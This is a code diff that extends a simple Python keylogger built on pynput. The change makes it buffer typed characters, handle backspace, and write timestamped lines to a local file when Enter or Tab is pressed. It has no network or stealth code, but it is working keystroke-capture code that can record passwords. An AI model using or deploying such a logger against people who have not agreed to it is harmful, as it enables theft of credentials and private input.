@@ -1,19 +1,28 @@
 from pynput import keyboard
+import datetime
+
+current_line = ""
 
 def keyPressed(key):
-    print(str(key))
+    global current_line
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
     with open("keyfile.txt", 'a') as logKey:
         try:
             char = key.char
-            logKey.write(char)
+            current_line += char
         except AttributeError:
             # Handle special keys
-            if key == keyboard.Key.enter:
-                logKey.write("<Enter>")
+            if key == keyboard.Key.enter or key == keyboard.Key.tab:
+                logKey.write(f"{timestamp} - {current_line}\n")
+                current_line = ""
             elif key == keyboard.Key.backspace:
-                logKey.write("<Backspace>")
+                # Remove last character when backspace is pressed
+                current_line = current_line[:-1]
+            elif key == keyboard.Key.space:
+                current_line += " "
             else:
-                logKey.write("<Unhandled Special Key>")
+                current_line += f"[Unhandled_Special_Key]"
 
 def on_release(key):
     # Stop the listener on pressing 'F10'
